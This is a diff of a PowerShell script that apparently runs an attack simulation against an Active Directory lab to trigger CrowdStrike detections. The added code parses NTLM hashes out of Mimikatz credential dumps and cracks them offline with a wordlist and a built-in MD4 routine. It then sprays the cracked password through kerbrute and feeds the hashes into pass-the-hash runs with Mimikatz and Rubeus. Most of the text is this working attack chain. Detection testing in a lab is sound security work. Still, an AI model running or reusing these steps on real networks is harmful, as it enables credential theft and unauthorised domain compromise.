@@ -13,7 +13,7 @@
 $ErrorActionPreference = "Continue"
 $idpDir = "C:\IDP_Files"
 $mimiExe = "$idpDir\Mimikatz\x64\mimikatz.exe"
-$clarkHash = "802ec5974a4f18e086e8b1411b2e3ea3"
+$wordlistFile = "$idpDir\wordlist.txt"
 
 # --- Validate env vars on startup ---
 $missing = @()
@@ -25,15 +25,24 @@ if ($missing.Count -gt 0) {
     Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
     Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
     Write-Host '    set ENV_DOMAIN=lab.yourdomain.com' -ForegroundColor Gray
-    Write-Host '    set ENV_DC_IP=172.16.1.6' -ForegroundColor Gray
-    Write-Host '    set ENV_BL=10.3.108.30' -ForegroundColor Gray
-    Write-Host '    set ENV_DT=10.3.108.31' -ForegroundColor Gray
+    Write-Host '    set ENV_DC_IP=<DC IP>' -ForegroundColor Gray
+    Write-Host '    set ENV_BL=<BL IP>' -ForegroundColor Gray
+    Write-Host '    set ENV_DT=<DT IP>' -ForegroundColor Gray
     pause
     exit 1
 }
 
-# Hash/password files saved between steps
+# Hash files saved between steps (live extraction, never hardcoded)
+$clarkHashFile = "$idpDir\clark_hash.txt"
 $svcHashFile = "$idpDir\svc_runbook_hash.txt"
+
+function Get-ClarkHash {
+    if (Test-Path $clarkHashFile) {
+        return (Get-Content $clarkHashFile -First 1).Trim()
+    }
+    Write-Host "[!] No clark.monroe hash found. Run Step 1 first." -ForegroundColor Red
+    return $null
+}
 
 function Get-SvcRunbookHash {
     if (Test-Path $svcHashFile) {
@@ -44,7 +53,11 @@ function Get-SvcRunbookHash {
 }
 
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
-Write-Host "[+] clark.monroe NTLM: $clarkHash" -ForegroundColor Green
+if (Test-Path $clarkHashFile) {
+    Write-Host "[+] clark.monroe NTLM: $(Get-Content $clarkHashFile -First 1)" -ForegroundColor Green
+} else {
+    Write-Host "[*] clark.monroe hash not yet extracted. Run Step 1." -ForegroundColor Yellow
+}
 Start-Sleep -Seconds 2
 
 function Show-Menu {
@@ -60,7 +73,7 @@ function Show-Menu {
     Write-Host "  1: System recon + credential dump                [whoami, sysinfo, dump NTLM]"
     Write-Host "  2: Network discovery (ARP + port scan)           [Find DC, DT, BL on subnet]"
     Write-Host "  3: LDAP recon via PtH (enumerate AD)             [Discover svc_runbook, groups]"
-    Write-Host "  4: Credential Scanning (kerbrute via PtH)        [CredentialScanning detection]"
+    Write-Host "  4: Hash cracking + kerbrute spray                [Crack demo -> CredentialScanning]"
     Write-Host
     Write-Host "  --- Phase 4: Pivot to DT (Falcon EDR triggers) ---" -ForegroundColor Yellow
     Write-Host "  5: PtH clark.monroe -> RDP to DT                 [PassTheHash + EDR: suspicious logon]"
@@ -120,8 +133,26 @@ do {
             & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step1_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"
 
             Write-Host "`n[+] Output saved to: $idpDir\step1_cred_dump.log" -ForegroundColor Green
-            Write-Host "[+] Found cached domain account: clark.monroe" -ForegroundColor Green
-            Write-Host "    NTLM: $clarkHash" -ForegroundColor White
+
+            # Auto-extract clark.monroe NTLM hash from dump
+            $dumpLog = "$idpDir\step1_cred_dump.log"
+            if (Test-Path $dumpLog) {
+                $logContent = Get-Content $dumpLog -Raw
+                # sekurlsa::logonpasswords pattern: User : clark.monroe ... NTLM : <hash>
+                if ($logContent -match "clark\.monroe[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
+                    $extractedClark = $Matches[1].ToLower()
+                    $extractedClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
+                    Write-Host "[+] clark.monroe NTLM extracted and saved: $extractedClark" -ForegroundColor Green
+                } else {
+                    Write-Host "[!] Could not auto-extract clark.monroe hash from dump." -ForegroundColor Yellow
+                    $manualHash = Read-Host "  Enter clark.monroe NTLM hash manually"
+                    if ($manualHash -and $manualHash.Length -eq 32) {
+                        $manualHash | Out-File -FilePath $clarkHashFile -Encoding ASCII
+                        Write-Host "[+] Hash saved." -ForegroundColor Green
+                    }
+                }
+            }
+
             Write-Host
             Write-Host "[*] We have the NTLM hash - all next steps use Pass-the-Hash (no password needed)." -ForegroundColor Cyan
             Write-Host "[*] Next: Step 2 (network discovery) to find targets on the subnet." -ForegroundColor Cyan
@@ -304,6 +335,9 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
             Write-Host "  (A new window will open with LDAP results)" -ForegroundColor Gray
             Write-Host
 
+            $clarkHash = Get-ClarkHash
+            if (-not $clarkHash) { break }
+
             # PtH to spawn batch file in clark.monroe context
             & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_ldap_recon.bat" "exit"
 
@@ -314,43 +348,218 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
         '4' {
             Clear-Host
-            Write-Host "[Step 4] Credential Scanning - kerbrute via PtH" -ForegroundColor Cyan
-            Write-Host "         Using PtH context to spray Kerberos pre-auth..." -ForegroundColor Gray
+            Write-Host "[Step 4] Hash Cracking + Credential Scanning" -ForegroundColor Cyan
+            Write-Host "         Step 4a: Crack demo account NTLM hash from Step 1 dump" -ForegroundColor Gray
+            Write-Host "         Step 4b: Spray cracked password via kerbrute" -ForegroundColor Gray
             Write-Host "         Triggers: CredentialScanningActiveDirectory" -ForegroundColor Yellow
+            Write-Host
+
+            # --- Step 4a: Crack the demo NTLM hash ---
+            Write-Host "--- 4a: NTLM Hash Cracking ---" -ForegroundColor Yellow
+            Write-Host
+
+            # Try to extract demo hash from Step 1 dump log
+            $demoHash = $null
+            $dumpLog = "$idpDir\step1_cred_dump.log"
+            if (Test-Path $dumpLog) {
+                $logContent = Get-Content $dumpLog -Raw
+                # Match SAM dump pattern: User : demo ... Hash NTLM: <hash>
+                if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
+                    $demoHash = $Matches[1].ToLower()
+                    Write-Host "  [+] Extracted demo NTLM from Step 1 dump: $demoHash" -ForegroundColor Green
+                }
+            }
+
+            if (-not $demoHash) {
+                Write-Host "  [*] Could not auto-extract demo hash from dump log." -ForegroundColor Yellow
+                $demoHash = Read-Host "  Enter the demo account NTLM hash (from Step 1)"
+            }
+
+            if (-not $demoHash -or $demoHash.Length -ne 32) {
+                Write-Host "  [!] Invalid hash. Run Step 1 first to dump credentials." -ForegroundColor Red
+                Write-Host "  [*] You can also manually enter a password for kerbrute below." -ForegroundColor Gray
+            }
+
+            $crackedPw = $null
+            if ($demoHash -and $demoHash.Length -eq 32) {
+                Write-Host
+                Write-Host "  [*] Attempting offline dictionary attack against NTLM hash..." -ForegroundColor White
+                Write-Host "  [*] Testing common passwords..." -ForegroundColor Gray
+                Write-Host
+
+                # NTLM = MD4(UTF-16LE(password)) - compute and compare
+                # Load wordlist from external file, fallback to small embedded list
+                if (Test-Path $wordlistFile) {
+                    $wordlist = Get-Content $wordlistFile | Where-Object { $_.Trim() -ne "" }
+                    Write-Host "  [*] Loaded $($wordlist.Count) passwords from $wordlistFile" -ForegroundColor Gray
+                } else {
+                    Write-Host "  [*] No wordlist.txt found, using built-in mini list" -ForegroundColor Gray
+                    Write-Host "  [*] Drop a larger wordlist at $wordlistFile for better results" -ForegroundColor Gray
+                    $wordlist = @(
+                        "password", "Password1", "Password123", "Welcome1", "Welcome123",
+                        "Changeme1", "Changeme123", "Summer2024", "Winter2024", "Spring2024",
+                        "P@ssw0rd", "P@ssword1", "Admin123", "admin", "letmein",
+                        "qwerty123", "abc123", "monkey123", "dragon", "master",
+                        "demo", "Demo", "Demo1", "Demo123", "demo123",
+                        "DemoUser1", "DemoPass1", "D3mo!", "demo!@#",
+                        "CrowdStrike1", "Falcon123", "Test1234", "test", "Test123",
+                        "Company1", "Company123", "Passw0rd!", "Passw0rd",
+                        "1234567890", "Football1", "Baseball1", "iloveyou",
+                        "trustno1", "shadow", "sunshine", "princess",
+                        "!@#$%^&*", "Aa123456", "Zaq12wsx", "Qwerty1!"
+                    )
+                }
+
+                # MD4 via .NET (used by NTLM)
+                Add-Type -TypeDefinition @"
+using System;
+using System.Text;
+using System.Security.Cryptography;
+public class NTLM {
+    public static string Hash(string password) {
+        byte[] data = Encoding.Unicode.GetBytes(password);
+        // MD4 via BCrypt
+        byte[] hash;
+        using (var md4 = System.Security.Cryptography.MD4.Create()) {
+            hash = md4.ComputeHash(data);
+        }
+        return BitConverter.ToString(hash).Replace("-","").ToLower();
+    }
+}
+"@ -ErrorAction SilentlyContinue
+
+                # Fallback: use mimikatz or manual MD4 if .NET MD4 unavailable
+                $useFallback = $false
+                try {
+                    $testHash = [NTLM]::Hash("test")
+                    if (-not $testHash) { $useFallback = $true }
+                } catch {
+                    $useFallback = $true
+                }
+
+                if ($useFallback) {
+                    # Manual MD4 in PowerShell (pure implementation)
+                    Write-Host "  [*] Using built-in MD4 implementation..." -ForegroundColor Gray
+                    function Get-NTLMHash {
+                        param([string]$Password)
+                        $bytes = [System.Text.Encoding]::Unicode.GetBytes($Password)
+                        # Use Windows CryptoAPI via P/Invoke
+                        Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class CryptoMD4 {
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr hHash);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint dwFlags);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptGetHashParam(IntPtr hHash, uint dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptDestroyHash(IntPtr hHash);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
+
+    public static string ComputeMD4(byte[] data) {
+        IntPtr hProv = IntPtr.Zero;
+        IntPtr hHash = IntPtr.Zero;
+        // PROV_RSA_FULL=1, CRYPT_VERIFYCONTEXT=0xF0000000, CALG_MD4=0x8002
+        CryptAcquireContext(ref hProv, null, null, 1, 0xF0000000);
+        CryptCreateHash(hProv, 0x8002, IntPtr.Zero, 0, ref hHash);
+        CryptHashData(hHash, data, (uint)data.Length, 0);
+        byte[] hash = new byte[16];
+        uint len = 16;
+        CryptGetHashParam(hHash, 2, hash, ref len, 0);
+        CryptDestroyHash(hHash);
+        CryptReleaseContext(hProv, 0);
+        return BitConverter.ToString(hash).Replace("-","").ToLower();
+    }
+}
+"@ -ErrorAction SilentlyContinue
+                        return [CryptoMD4]::ComputeMD4($bytes)
+                    }
+                }
+
+                $attempts = 0
+                $startTime = Get-Date
+                foreach ($pw in $wordlist) {
+                    $attempts++
+                    try {
+                        if ($useFallback) {
+                            $computed = Get-NTLMHash -Password $pw
+                        } else {
+                            $computed = [NTLM]::Hash($pw)
+                        }
+
+                        if ($computed -eq $demoHash) {
+                            $elapsed = ((Get-Date) - $startTime).TotalSeconds
+                            Write-Host "  [+] CRACKED! Password: $pw" -ForegroundColor Green
+                            Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
+                            Write-Host "  [+] Hash match: $computed = $demoHash" -ForegroundColor DarkGreen
+                            $crackedPw = $pw
+                            break
+                        }
+                    } catch {
+                        # Skip hash computation errors
+                    }
+
+                    # Progress every 10 attempts
+                    if ($attempts % 10 -eq 0) {
+                        Write-Host "  [*] Tried $attempts passwords..." -ForegroundColor DarkGray
+                    }
+                }
+
+                if (-not $crackedPw) {
+                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
+                    Write-Host "  [-] Exhausted wordlist ($attempts passwords in $([math]::Round($elapsed,2))s)" -ForegroundColor Yellow
+                    Write-Host "  [*] Try a larger wordlist (rockyou.txt) offline with hashcat:" -ForegroundColor Gray
+                    Write-Host "      hashcat -m 1000 $demoHash /usr/share/wordlists/rockyou.txt" -ForegroundColor Gray
+                }
+            }
+
+            # --- Step 4b: kerbrute password spray ---
+            Write-Host
+            Write-Host "--- 4b: Kerbrute Password Spray ---" -ForegroundColor Yellow
             Write-Host
 
             # Use LDAP-harvested list if available, fallback to static list
             $userFile = "$idpDir\ldap_users.txt"
             if (-not (Test-Path $userFile)) {
                 $userFile = "$idpDir\users.txt"
-                Write-Host "         Using static user list (run Step 3 first for LDAP list)" -ForegroundColor Yellow
+                Write-Host "  Using static user list (run Step 3 first for LDAP list)" -ForegroundColor Yellow
             } else {
-                Write-Host "         Using LDAP-harvested user list" -ForegroundColor Green
+                Write-Host "  Using LDAP-harvested user list" -ForegroundColor Green
             }
-            Write-Host "         DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
+            Write-Host "  DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
             Write-Host
 
-            # kerbrute bruteuser mode with hash? kerbrute doesn't support hashes natively
-            # Instead: use PtH to spawn kerbrute in clark.monroe context
-            # kerbrute passwordspray needs a password - use overpass-the-hash first
-            Write-Host "  Option A: kerbrute with known password" -ForegroundColor Yellow
-            Write-Host "  Option B: Skip (PtH-based attacks don't need password spray)" -ForegroundColor Yellow
-            Write-Host
-            $choice = Read-Host "  Enter password to spray, or press Enter to skip"
+            if ($crackedPw) {
+                Write-Host "  [+] Using cracked password: $crackedPw" -ForegroundColor Green
+                $sprayPw = $crackedPw
+            } else {
+                $sprayPw = Read-Host "  Enter password to spray (or press Enter to skip)"
+            }
 
-            if ($choice) {
+            if ($sprayPw) {
+                Write-Host
+                Write-Host "  [*] Spraying $sprayPw against all users via Kerberos pre-auth..." -ForegroundColor White
+                Write-Host "  [*] This will trigger CredentialScanningActiveDirectory in CrowdStrike IDP" -ForegroundColor Yellow
+                Write-Host
+
                 try {
                     $proc = Start-Process -FilePath "$idpDir\kerbrute.exe" `
-                        -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $choice" `
+                        -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPw" `
                         -NoNewWindow -Wait -PassThru
-                    Write-Host "`n[+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
+                    Write-Host "`n  [+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
                 } catch {
-                    Write-Host "[!] Kerbrute error: $_" -ForegroundColor Red
+                    Write-Host "  [!] Kerbrute error: $_" -ForegroundColor Red
                 }
             } else {
-                Write-Host "[*] Skipped. Moving to PtH-based attacks." -ForegroundColor Cyan
+                Write-Host "  [*] Skipped. Moving to PtH-based attacks." -ForegroundColor Cyan
             }
 
+            Write-Host
             Write-Host "[*] Next: Step 5 (PtH clark.monroe -> RDP to DT)." -ForegroundColor Cyan
         }
 
@@ -363,9 +572,12 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
             Write-Host "  User:   clark.monroe" -ForegroundColor White
             Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
-            Write-Host "  NTLM:   $clarkHash" -ForegroundColor White
             Write-Host "  Target: $env:ENV_DT (DT)" -ForegroundColor White
             Write-Host
+
+            $clarkHash = Get-ClarkHash
+            if (-not $clarkHash) { break }
+            Write-Host "  NTLM:   $clarkHash" -ForegroundColor White
 
             # Create batch launcher for RDP (mimikatz /run: can't pass args to exe)
             "mstsc /v:$env:ENV_DT" | Out-File -FilePath "$idpDir\run_rdp_dt.bat" -Encoding ASCII
@@ -414,6 +626,9 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
             Write-Host "         Requesting TGS via PtH context..." -ForegroundColor Gray
             Write-Host "         Triggers: Kerberoasting detection" -ForegroundColor Yellow
             Write-Host
+
+            $clarkHash = Get-ClarkHash
+            if (-not $clarkHash) { break }
 
             if (Test-Path "$idpDir\Rubeus.exe") {
                 # Rubeus supports /rc4: for hash-based auth
